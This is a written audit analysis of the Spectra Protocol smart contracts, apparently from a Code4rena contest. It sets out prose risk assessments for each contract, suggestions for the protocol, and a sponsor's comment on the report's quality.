## Systemic Risks, Centralization Risks, Technical Risks & Integration Risks

-
PrincipalToken.sol

- Systemic Risks:

- Flash Loan Vulnerabilities: The contract implements flash loan functionality, allowing users to borrow assets temporarily. Flash loan implementations can be susceptible to manipulation and abuse, leading to significant disruptions if exploited maliciously.

- Price Oracle Dependency: The contract relies on external price oracles to determine exchange rates between assets. Inaccurate or manipulated price feeds can result in incorrect tokenization or redemption rates, leading to financial losses for users.

- Centralization Risks:

- The contract has several functions that can only be accessed by a restricted set of addresses (`restricted` modifier). Depending on the implementation and management of these privileged addresses, there’s a risk of centralization where control over critical functions is concentrated in a few entities.

- Technical Risks:

- The contract implements flash loans (`flashLoan` function), which could introduce technical risks if not implemented securely. Flash loans are susceptible to various attacks such as reentrancy, front-running, and arbitrage if not properly handled.

- Integration Risks:

- The contract integrates with external contracts (`IERC4626`, `IRewardsProxy`, `IRegistry`, `IERC3156FlashBorrower`, `IERC3156FlashLender`, `IERC20`) for various functionalities. Integration with external contracts introduces risks related to dependency on external systems, potential changes in interfaces, and unforeseen behavior of these external contracts.

-
YieldToken.sol

- Systemic Risks:

- Dependence on Time: The `balanceOf` function in the contract depends on the comparison of the current block timestamp with the maturity timestamp obtained from `IPrincipalToken`. Any discrepancy or manipulation of time-related variables could lead to systemic risks by affecting the calculation of token balances.

- Interconnectedness: This contract interacts with other contracts in the system, such as `IPrincipalToken`. Changes or issues in these interconnected contracts could lead to systemic risks within the entire system.

- Centralization Risks:

- Single Point of Failure: The contract has a single address `pt` which represents the associated principal token. If this token contract becomes compromised or inaccessible, it could impact the functionality of the `YieldToken` contract, potentially leading to centralization risks.

- Control Over Minting and Burning: The `YieldToken` contract allows minting and burning functions to be called only by the principal token contract (`pt`). This centralizes control over these critical operations to the principal token contract.

- Technical Risks:

- Reentrancy Vulnerability: Although not apparent in the provided code, if any of the functions in this contract or the contracts it interacts with allow external calls to untrusted contracts before updating state variables, it could potentially introduce reentrancy vulnerabilities.

- Integration Risks:

- Compatibility Issues: The contract relies on external libraries and interfaces such as `openzeppelin-math` and `openzeppelin-erc20-extensions`. Changes or updates to these external dependencies could lead to integration risks if they are not compatible with the existing codebase.

- Interface Consistency: The `YieldToken` contract implements various interfaces (`IERC20`, `IYieldToken`, `ERC20Upgradeable`). Any inconsistencies or mismatches between the implementations of these interfaces could lead to integration issues with other parts of the system.

-
AMBeacon.sol

- Systemic Risks:

- Upgrade Functionality: The `upgradeTo` function allows the authority to change the implementation contract address, affecting all proxies that rely on this beacon. If this upgrade process is not properly managed or if the new implementation has vulnerabilities, it could lead to systemic risks affecting all contracts using this beacon.

- Access Control: The contract relies on access control provided by `AccessManaged` for managing authority roles. Any misconfiguration or unauthorized access to the upgrade functionality could lead to systemic risks, as it allows a single entity to control the upgrade process, potentially impacting the entire system.

- Authority Control: The contract relies on a single authority, managed through `AccessManaged`, to determine the implementation contract address. This centralized control could lead to centralization risks if the authority misuses its power or if there’s a single point of failure in managing upgrades.

- Implementation Validation: The `_setImplementation` function checks if the provided `newImplementation` address points to a valid contract by verifying its bytecode length. However, this check may not be comprehensive enough to ensure the security and reliability of the new implementation. Additional checks or audits may be necessary to mitigate technical risks associated with using unverified or potentially malicious implementations.

- Proxy Integration: Contracts that rely on this beacon must properly integrate with it to ensure seamless upgrades and compatibility with the new implementations. Any issues in integrating with the beacon or handling upgrades could lead to integration risks, potentially disrupting the functionality of contracts using this beacon.

-
AMProxyAdmin.sol

- Systemic Risks:

- Upgrade Functionality: The `upgradeAndCall` function allows for upgrading the proxy to a new implementation and calling a function on the new implementation. If not properly secured or if the new implementation has vulnerabilities, this could introduce systemic risks, especially if sensitive or critical functions are called during the upgrade process.

- Centralization Risks:

- Single Authority: Similar to the previous contract, this contract relies on a single authority managed through `AccessManaged` for controlling upgrader roles. This centralized control could lead to centralization risks if the authority misuses its power or if there’s a single point of failure in managing upgrades.

- Technical Risks:

- Fallback Function Usage: The contract mentions the `receive` function, indicating the possibility of using it during an upgrade if the second argument of `upgradeAndCall` is an empty byte string. Depending on the implementation of the new contract, relying on the `receive` function during upgrades might introduce technical risks, especially if it’s not handled correctly.

- Integration Risks:

- Interface Versioning: The contract includes a versioning system for the upgrade interface (`UPGRADE_INTERFACE_VERSION`). Depending on the compatibility of this version with existing contracts and tools, integration risks may arise if there are changes in the interface version that are not backward compatible. Developers integrating this contract need to ensure compatibility with the specified version.

-
AMTransparentUpgradeableProxy.sol

- Systemic Risks:

- Upgrade Functionality: The `upgradeToAndCall` function enables upgrading the proxy to a new implementation and calling a function on the new implementation. If not properly secured or if the new implementation has vulnerabilities, this could introduce systemic risks, especially if sensitive or critical functions are called during the upgrade process.

- Centralization Risks:

- Proxy Administration: The proxy’s administration is handled by an instance of `AMProxyAdmin`, which is initially set during deployment and is immutable thereafter. This centralized control could lead to centralization risks if the admin account is compromised or misuses its power.

- Technical Risks:

- Selector Clashes: The contract implements the transparent proxy pattern to avoid selector clashes, which can potentially be used in an attack. However, handling selector clashes requires careful management to ensure that there are no conflicts between existing and new functions. Any inadvertent conflicts could compromise the upgradeability and transparency of the proxy.

- Integration Risks:

- ERC-1967 Compatibility: The contract implements ERC-1967 compatibility for upgradeable proxies. While this enhances interoperability, it also introduces integration risks if not properly understood or implemented. Developers integrating with this contract need to ensure they adhere to ERC-1967 standards to avoid unexpected behaviors or vulnerabilities.

-
PrincipalTokenUtil.sol

- Systemic Risks:

- Asset Decimals Handling: The `_tryGetTokenDecimals` function attempts to fetch token decimals from the given token address. If this operation fails or returns unexpected results, it could lead to systemic risks, especially if other parts of the system rely on accurate token decimals for calculations.

- Centralization Risks:

- Registry Dependency: The contract relies on a registry contract (`IRegistry`) to fetch fee rates and other parameters. Centralization risks may arise if this registry contract is controlled by a single entity or has centralized governance, as changes to fee rates or other parameters could impact the entire system without sufficient decentralization.

- Technical Risks:

- Rate Handling: Several functions (`_computeYield`, `_convertToSharesWithRate`, `_convertToAssetsWithRate`) involve rate calculations (e.g., PT rates, IBT rates). Incorrect rate handling could lead to technical risks such as miscalculations, underflows, or overflows, potentially resulting in financial losses or unexpected behavior.

- Integration Risks:

- External Contracts Interaction: The contract interacts with external contracts such as yield tokens, principal tokens, and registries. Integration risks may arise if these external contracts change their interfaces, behavior, or implementation details, potentially causing the current contract to malfunction or behave unexpectedly. Solidity version upgrades or changes to OpenZeppelin interfaces could also introduce integration risks.

-
RayMath.sol

- Systemic Risks:

- Precision Loss: The `fromRay` function converts a value from Ray (27-decimal precision) to a representation with a specified number of decimals. Precision loss can occur during this conversion, especially if the target decimals are significantly lower than 27, leading to potential systemic risks in financial calculations.

- Centralization Risks:

- Single Authorship: The `RayMath` library is authored by a single entity (“Spectra”). Centralization risks may arise if maintenance or updates to this library are solely dependent on this single entity, potentially leading to bottlenecks or vulnerabilities if the entity becomes unavailable or unresponsive.

- Technical Risks:

- Assembly Usage: The library extensively uses inline assembly for arithmetic operations. While assembly can be more efficient, it introduces technical risks due to potential vulnerabilities or errors in assembly code, such as integer overflows, underflows, or incorrect logic, which could compromise the integrity and security of the library.

- Rounding Mechanism: The `fromRay` function includes a rounding mechanism based on the `_roundUp` parameter. Incorrect rounding or edge cases not handled properly could lead to technical risks such as incorrect rounding behavior or unexpected results in financial calculations.

- Integration Risks:

- Dependency on External Contracts: If other contracts within the system rely on the `RayMath` library for decimal conversions, any changes or updates to this library could potentially introduce integration risks. Changes in function signatures, logic, or behavior of the `RayMath` library may require corresponding updates in dependent contracts to ensure compatibility and proper functioning.

## Suggestions

### What could they have done better?

-

- If we look at the test scope and content of the project with a systematic checklist, we can see which parts are good and which areas have room for improvement As a result of my analysis, those marked in green are the ones that the project has fully achieved. The remaining areas are the development areas of the project in terms of testing ;

-

- It is recommended to increase the test coverage to 100% so make sure that each and every line is battle tested

### Suggestions for the Spectra Protocol

- Dynamic Fee Structures: Implement dynamic fee structures that adjust based on market conditions, user activity, or other relevant factors. This flexibility can optimize revenue generation while ensuring competitive fees for users, ultimately enhancing protocol sustainability.

- Liquidity Incentives: Introduce liquidity mining programs or yield farming incentives to attract liquidity providers and boost trading activity within the protocol. Rewarding users with tokens or other incentives can stimulate participation and foster a vibrant ecosystem.

- Cross-Protocol Integrations: Explore opportunities for integrating with other DeFi protocols, such as decentralized exchanges (DEXs), lending platforms, or asset management protocols. Cross-protocol integrations can unlock new use cases, enhance liquidity, and create synergies between different DeFi ecosystems.

- Risk Management Tools: Provide users with comprehensive risk management tools and analytics to assess and mitigate risks associated with yield farming, liquidity provision, and other activities. Empowering users with data-driven insights can help them make informed decisions and navigate volatile market conditions more effectively.

- Community Governance: Transition towards a decentralized governance model where protocol decisions are made collectively by the community through governance tokens and voting mechanisms. Community governance fosters decentralization, transparency, and inclusivity, aligning the protocol’s interests with those of its stakeholders.

- Staking and Voting Rewards: Incentivize token holders to actively participate in governance and decision-making processes by offering staking rewards and voting incentives. Rewarding users for their engagement encourages active participation and strengthens the protocol’s governance mechanisms.

- Audits and Security Enhancements: Conduct regular security audits and implement robust security measures to protect user funds and safeguard the integrity of the protocol. Prioritize code reviews, bug bounties, and continuous monitoring to proactively identify and address potential vulnerabilities.

### What’s unique?

- Yield-Bearing Tokens: Spectra introduces the concept of yield-bearing tokens (YT), which represent ownership of the yield generated by principal tokens (PT) deposited in the protocol. This innovative mechanism allows users to earn passive income from their deposited assets, enhancing the utility of their holdings.

- Modular Architecture: The protocol’s modular architecture enables seamless integration of new features and upgrades without disrupting existing functionality. By leveraging proxy contracts and libraries, Spectra ensures flexibility, extensibility, and maintainability, allowing for efficient protocol evolution over time.

- Flash Loan Support: Spectra supports flash loans, allowing users to borrow assets temporarily without collateralization. This feature facilitates efficient capital deployment and arbitrage opportunities, enhancing liquidity and trading activity within the protocol.

- Fee Customization: The protocol offers customizable fee structures for tokenization, yield claiming, and flash loans, empowering administrators to adjust fees based on market conditions and protocol requirements. This flexibility ensures sustainable revenue generation while maintaining competitiveness and user satisfaction.

- Secure Mathematical Operations: Spectra incorporates the RayMath library for precise mathematical operations and conversions, ensuring accuracy and reliability in complex financial calculations. By using fixed-point arithmetic and overflow protection, the protocol minimizes errors and vulnerabilities, enhancing security and trustworthiness.

## Issues surfaced from Attack Ideas in README

- Decimals imprecisions should always benefit the protocol and no user should be able to extract extra value.

- Proxy Admin and Beacon are a modified version of Openzepelin origin contract replacin OZ Ownable with OZ Access Managed. Check if this modification can be harmful outside of our trust model.

- Imprecisions and rounding errors.

- Manipulation of the IBT rate.

- Mechanism of negative rates and the impact on the PT rate.

### Time spent:

30 hours

jeanchambras (Sponsor) commented:

The report is of great quality. I noticed some confusion regarding the roles within the protocol. The risk assessment, although simplistic and possibly reused in part from past audits, is well-curated within the context of this audit.

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.

Top- Twitter
- Discord
- GitHub
- Media kit
- Terms
- Privacy
